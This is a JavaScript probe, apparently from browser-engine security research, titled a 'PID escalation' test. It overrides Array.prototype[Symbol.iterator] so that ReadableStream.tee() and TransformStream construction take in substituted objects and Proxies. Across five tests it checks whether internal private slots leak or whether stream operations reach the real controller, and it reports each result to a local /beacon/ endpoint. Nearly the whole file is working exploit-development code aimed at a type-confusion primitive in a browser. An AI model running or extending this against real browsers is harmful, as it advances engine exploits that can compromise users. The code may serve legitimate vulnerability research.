// p462-pid-escalation.js — PID (Private-name Inversion via tee()) escalation probe
// Goal: determine what private slots are written, if Proxy traps capture them,
// and whether stream operations on the PID'd object reach the controller.
(function() {
  var RUN = 'p462-' + Date.now().toString(36);
  function B(tag, data) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/' + tag + '/' + RUN, false);
      x.send(typeof data === 'string' ? data : JSON.stringify(data));
    } catch(e) {}
  }
  B('BOOT', navigator.userAgent);

  // Utility: safe call with error capture
  function safe(fn) {
    try { var r = fn(); return { ok: true, val: String(r) }; }
    catch(e) { return { ok: false, err: e.constructor.name + ': ' + e.message }; }
  }

  // === TEST A: PID Proxy interception ===
  // Can we capture private name symbols through a Proxy's set trap?
  try {
    var proxyLog = [];
    var proxyTarget = {};
    var proxyHandler = {
      set: function(target, prop, value, receiver) {
        proxyLog.push({
          prop: typeof prop === 'symbol' ? prop.toString() : String(prop),
          propType: typeof prop,
          valType: typeof value,
          val: String(value).slice(0, 80)
        });
        target[prop] = value;
        return true;
      },
      get: function(target, prop, receiver) {
        if (prop === Symbol.iterator || prop === 'length') return target[prop];
        proxyLog.push({ get: typeof prop === 'symbol' ? prop.toString() : String(prop), propType: typeof prop });
        return target[prop];
      },
      defineProperty: function(target, prop, desc) {
        proxyLog.push({
          define: typeof prop === 'symbol' ? prop.toString() : String(prop),
          propType: typeof prop
        });
        Object.defineProperty(target, prop, desc);
        return true;
      }
    };
    var X_proxy = new Proxy(proxyTarget, proxyHandler);

    // Create a real ReadableStream to tee
    var rs = new ReadableStream({
      start: function(c) { c.close(); }
    });

    // Poison Array.prototype[Symbol.iterator]
    var origIter = Array.prototype[Symbol.iterator];
    var iterCallCount = 0;
    Array.prototype[Symbol.iterator] = function() {
      iterCallCount++;
      if (iterCallCount <= 1) return origIter.call(this); // first call: normal
      // second call (from C++ SequenceConverter): yield X_proxy twice
      var i = 0;
      return {
        next: function() {
          if (i >= 2) return { done: true };
          i++;
          return { done: false, value: X_proxy };
        }
      };
    };

    var pair;
    var teeError = null;
    try {
      pair = rs.tee();
    } catch(e) {
      teeError = e.constructor.name + ': ' + e.message;
    }

    Array.prototype[Symbol.iterator] = origIter;

    B('A-TEE', {
      teeError: teeError,
      iterCalls: iterCallCount,
      pair0Type: pair ? typeof pair[0] : 'none',
      pair1Type: pair ? typeof pair[1] : 'none',
      proxyLogCount: proxyLog.length,
      proxyLog: proxyLog.slice(0, 20)
    });

    // Try cancel on pair[0] — should write private slots through to X_proxy
    if (pair) {
      proxyLog.length = 0;
      var cancelResult = safe(function() { return pair[0].cancel(); });
      B('A-CANCEL', {
        cancelResult: cancelResult,
        proxyLogAfterCancel: proxyLog.slice(0, 30)
      });
    }
  } catch(e) {
    B('A-ERR', e.constructor.name + ': ' + e.message);
  }

  // === TEST B: PID with plain object — check what's observable on X ===
  try {
    var X_plain = {};
    var rs2 = new ReadableStream({
      start: function(c) { c.close(); }
    });

    var origIter2 = Array.prototype[Symbol.iterator];
    var iterCount2 = 0;
    Array.prototype[Symbol.iterator] = function() {
      iterCount2++;
      if (iterCount2 <= 1) return origIter2.call(this);
      var i = 0;
      return {
        next: function() {
          if (i >= 2) return { done: true };
          i++;
          return { done: false, value: X_plain };
        }
      };
    };

    var pair2;
    try { pair2 = rs2.tee(); } catch(e) { B('B-TEE-ERR', e.message); }
    Array.prototype[Symbol.iterator] = origIter2;

    if (pair2) {
      // Cancel to write private slots
      var cancelRes2 = safe(function() { return pair2[0].cancel(); });

      // Enumerate X_plain
      var ownNames = Object.getOwnPropertyNames(X_plain);
      var ownSyms = Object.getOwnPropertySymbols(X_plain);
      var reflectKeys = Reflect.ownKeys(X_plain);
      var forInKeys = [];
      for (var k in X_plain) forInKeys.push(k);

      // Check specific property names
      var checks = {
        hasDisturbed: 'disturbed' in X_plain,
        hasState: 'state' in X_plain,
        hasController: 'readableStreamController' in X_plain,
        hasReader: 'reader' in X_plain,
        disturbedVal: X_plain.disturbed,
        stateVal: X_plain.state
      };

      B('B-ENUM', {
        cancelRes: cancelRes2,
        ownNames: ownNames,
        ownSymsCount: ownSyms.length,
        ownSyms: ownSyms.map(function(s) { return s.toString(); }),
        reflectKeys: reflectKeys.map(function(k) { return typeof k === 'symbol' ? k.toString() : k; }),
        forInKeys: forInKeys,
        checks: checks
      });

      // Try calling ReadableStream methods on pair[0]
      var opResults = {};
      opResults.getReader = safe(function() { return pair2[0].getReader(); });
      opResults.tee = safe(function() { return pair2[0].tee(); });

      // pipeTo needs a writable stream
      var ws = new WritableStream({ write: function(chunk) {} });
      opResults.pipeTo = safe(function() { return pair2[0].pipeTo(ws); });

      B('B-OPS', opResults);

      // Try calling RS methods directly on X_plain (not through pair)
      var directOps = {};
      directOps.cancel = safe(function() { return ReadableStream.prototype.cancel.call(X_plain); });
      directOps.getReader = safe(function() { return ReadableStream.prototype.getReader.call(X_plain); });
      directOps.tee = safe(function() { return ReadableStream.prototype.tee.call(X_plain); });

      B('B-DIRECT', directOps);
    }
  } catch(e) {
    B('B-ERR', e.constructor.name + ': ' + e.message);
  }

  // === TEST C: Second PID on same object — does re-PID change controller? ===
  try {
    var X_reuse = {};
    // First PID
    var rs3 = new ReadableStream({ start: function(c) { c.close(); } });
    var origIter3 = Array.prototype[Symbol.iterator];
    var ic3 = 0;
    Array.prototype[Symbol.iterator] = function() {
      ic3++;
      if (ic3 <= 1) return origIter3.call(this);
      var i = 0;
      return { next: function() {
        if (i >= 2) return { done: true };
        i++;
        return { done: false, value: X_reuse };
      }};
    };
    var p3;
    try { p3 = rs3.tee(); } catch(e) {}
    Array.prototype[Symbol.iterator] = origIter3;

    // Cancel first pair → writes disturbed + state
    if (p3) safe(function() { return p3[0].cancel(); });

    // Second PID on same X_reuse
    var rs4 = new ReadableStream({ start: function(c) { c.close(); } });
    var origIter4 = Array.prototype[Symbol.iterator];
    var ic4 = 0;
    Array.prototype[Symbol.iterator] = function() {
      ic4++;
      if (ic4 <= 1) return origIter4.call(this);
      var i = 0;
      return { next: function() {
        if (i >= 2) return { done: true };
        i++;
        return { done: false, value: X_reuse };
      }};
    };
    var p4;
    try { p4 = rs4.tee(); } catch(e) { B('C-TEE2-ERR', e.message); }
    Array.prototype[Symbol.iterator] = origIter4;

    if (p4) {
      // Cancel second pair — X_reuse now has @state=closed from first PID
      var c4 = safe(function() { return p4[0].cancel(); });
      var c4b = safe(function() { return p4[1].cancel(); });

      // Also try getReader on second pair
      var gr4 = safe(function() { return p4[0].getReader(); });

      B('C-RESULT', {
        cancel0: c4,
        cancel1: c4b,
        getReader: gr4,
        ownSyms: Object.getOwnPropertySymbols(X_reuse).map(function(s) { return s.toString(); }),
        ownNames: Object.getOwnPropertyNames(X_reuse)
      });
    }
  } catch(e) {
    B('C-ERR', e.constructor.name + ': ' + e.message);
  }

  // === TEST D: PID + TransformStream disconnect combo ===
  try {
    var X_ts = {};
    var ts_real_r = null, ts_real_w = null;

    // Create TransformStream with double-iteration substitution
    var origIter5 = Array.prototype[Symbol.iterator];
    var ic5 = 0;
    var capturedStreams = [];
    Array.prototype[Symbol.iterator] = function() {
      ic5++;
      var self = this;
      if (ic5 === 1) {
        // First iteration (JS builtin): normal, but capture
        var origIt = origIter5.call(self);
        return {
          next: function() {
            var n = origIt.next();
            if (!n.done) capturedStreams.push(n.value);
            return n;
          }
        };
      }
      // Second iteration (C++ SequenceConverter):
      // For TransformStream, the array is [transformObj, ReadableStream, WritableStream]
      // We need to return the real transform obj but substitute readable/writable
      var i = 0;
      return {
        next: function() {
          if (i >= 3) return { done: true };
          var val;
          if (i === 0) {
            val = capturedStreams[0]; // real internal transform object
          } else {
            // Create real streams to substitute
            var subRS = new ReadableStream({ start: function(c) { c.close(); } });
            var subWS = new WritableStream({ write: function(chunk) {} });
            val = (i === 1) ? subRS : subWS;
          }
          i++;
          return { done: false, value: val };
        }
      };
    };

    var ts;
    var tsError = null;
    try {
      ts = new TransformStream({
        transform: function(chunk, controller) {
          controller.enqueue(chunk);
        }
      });
    } catch(e) {
      tsError = e.constructor.name + ': ' + e.message;
    }
    Array.prototype[Symbol.iterator] = origIter5;

    B('D-RESULT', {
      tsError: tsError,
      iterCalls: ic5,
      capturedCount: capturedStreams.length,
      readableIsSubstituted: ts ? (ts.readable !== capturedStreams[1]) : null,
      writableIsSubstituted: ts ? (ts.writable !== capturedStreams[2]) : null,
      readableType: ts ? ts.readable.constructor.name : 'none',
      writableType: ts ? ts.writable.constructor.name : 'none'
    });

    // Try to use the substituted streams
    if (ts) {
      var tsOps = {};
      tsOps.getReader = safe(function() { return ts.readable.getReader(); });
      tsOps.getWriter = safe(function() { return ts.writable.getWriter(); });

      // Check if real streams are different from IDL getters
      tsOps.realReadable = capturedStreams[1] ? capturedStreams[1].constructor.name : 'none';
      tsOps.realWritable = capturedStreams[2] ? capturedStreams[2].constructor.name : 'none';

      B('D-OPS', tsOps);
    }
  } catch(e) {
    B('D-ERR', e.constructor.name + ': ' + e.message);
  }

  // === TEST E: PID with Proxy that has getter returning controlled objects ===
  try {
    var capturedNames = [];
    var X_magic = {};

    // Override property access on X_magic to track all reads
    var magicProxy = new Proxy(X_magic, {
      get: function(target, prop) {
        capturedNames.push({ get: typeof prop === 'symbol' ? prop.toString() : String(prop), t: typeof prop });
        return target[prop];
      },
      set: function(target, prop, value) {
        capturedNames.push({ set: typeof prop === 'symbol' ? prop.toString() : String(prop), t: typeof prop, vt: typeof value });
        target[prop] = value;
        return true;
      },
      has: function(target, prop) {
        capturedNames.push({ has: typeof prop === 'symbol' ? prop.toString() : String(prop), t: typeof prop });
        return prop in target;
      }
    });

    // Do PID with magicProxy through getReader (different operation)
    var rs5 = new ReadableStream({ start: function(c) {} }); // don't close — leave readable
    var origIter6 = Array.prototype[Symbol.iterator];
    var ic6 = 0;
    Array.prototype[Symbol.iterator] = function() {
      ic6++;
      if (ic6 <= 1) return origIter6.call(this);
      var i = 0;
      return { next: function() {
        if (i >= 2) return { done: true };
        i++;
        return { done: false, value: magicProxy };
      }};
    };
    var p5;
    try { p5 = rs5.tee(); } catch(e) {}
    Array.prototype[Symbol.iterator] = origIter6;

    if (p5) {
      capturedNames.length = 0; // reset after tee setup

      // Try getReader instead of cancel
      var gr5 = safe(function() { return p5[0].getReader(); });

      B('E-READER', {
        getReaderResult: gr5,
        capturedOps: capturedNames.slice(0, 40)
      });

      // Now try cancel
      capturedNames.length = 0;
      var c5 = safe(function() { return p5[1].cancel('test'); });

      B('E-CANCEL', {
        cancelResult: c5,
        capturedOps: capturedNames.slice(0, 40)
      });
    }
  } catch(e) {
    B('E-ERR', e.constructor.name + ': ' + e.message);
  }

  B('DONE', RUN);
})();
